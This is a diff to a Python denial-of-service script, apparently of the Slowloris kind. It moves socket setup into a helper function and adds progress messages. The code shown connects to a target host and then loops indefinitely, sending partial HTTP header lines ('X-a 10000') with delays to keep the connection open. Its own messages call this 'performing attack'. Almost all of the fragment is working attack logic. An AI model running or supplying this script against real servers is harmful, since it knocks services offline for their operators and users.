@@ -45,9 +45,7 @@ def ctrlc_handler(signal, frame):
     exit(0)
 
 
-def main():
-    signal.signal(signal.SIGINT, ctrlc_handler)
-
+def init_socket():
     s = socket.socket()
     try:
         s.connect((args.ip, args.port))
@@ -55,22 +53,32 @@ def main():
         print("ERROR: server might be down, stopping attack")
         s.close()
         exit(1)
-    print(f"INFO: connected to {args.ip}:{args.port}")
+    print(f"INFO: fd={s.fileno()} connected to {args.ip}:{args.port}")
+    return s
 
+
+def main():
+    signal.signal(signal.SIGINT, ctrlc_handler)
+
+    s = init_socket()
     try:
         s.sendall(str.encode(request))
     except socket.error:
         print("ERROR: something went wrong with sending request")
         s.close()
         exit(1)
-    print("INFO: sending data...")
+    print("INFO: performing attack")
 
+    count = 1
     while True:
         try:
             s.sendall(b"X-a 10000\r\n")
         except socket.error:
             print("ERROR: something went wrong with sending request, exiting")
             break
+        print(f"\033[2KINFO: sending data{'.' * count}\r", end="")
+        count += 1
+        count = 1 if count > 5 else count
         time.sleep(args.time)
 
     s.close()
